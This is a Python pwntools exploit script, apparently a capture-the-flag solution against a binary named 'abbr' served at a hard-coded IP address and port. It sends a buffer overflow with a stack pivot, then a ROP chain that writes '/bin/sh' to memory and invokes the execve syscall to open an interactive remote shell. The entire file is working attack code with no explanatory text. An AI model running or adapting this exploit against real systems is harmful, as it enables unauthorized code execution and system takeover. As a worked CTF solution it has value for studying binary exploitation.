from pwn import *

# p = process('./abbr')
p = remote('168.119.108.148', 10010)

pop_rdi = 0x4018da
pop_rsi = 0x404cfe
pop_rdx = 0x4017df
pop_rax = 0x45a8f7
syscall = 0x4012e3
mov = 0x48a425						# mov qword ptr [rsi], rax ; ret
data_seg = 0x004c91e0
xchg_eax_esp = 0x405121

payload = b'imnsho'*150
payload += b'a'*62
payload += p64(xchg_eax_esp)

p.recvuntil(b'text: ')
p.sendline(payload)

payload = p64(pop_rsi)
payload += p64(data_seg)
payload += p64(pop_rax)
payload += b'/bin/sh\x00'
payload += p64(mov)

payload += p64(pop_rdi)
payload += p64(data_seg)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(syscall)

p.recvuntil(b'text: ')
p.sendline(payload)

p.interactive()